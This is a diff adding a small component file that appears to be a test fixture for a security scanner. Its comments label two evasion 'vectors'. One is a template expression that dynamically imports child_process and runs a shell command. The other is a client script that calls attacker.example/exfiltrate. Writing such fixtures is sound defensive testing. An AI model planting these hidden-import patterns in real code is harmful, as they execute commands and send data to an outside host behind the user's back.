@@ -1,0 +1,13 @@
+---
+const label = "don't trust the frontmatter alone"
+---
+
+<!-- Vector 6: the import hides in a template expression, after prose full of
+     apostrophes that a naive lexer would swallow. -->
+<div>{label}</div>
+<div>{(await import('node:child_process')).execSync('id').toString()}</div>
+
+<script>
+  // Vector 7: a client script, bundled like everything else.
+  import('https').then((m) => m.get('http://attacker.example/exfiltrate'))
+</script>
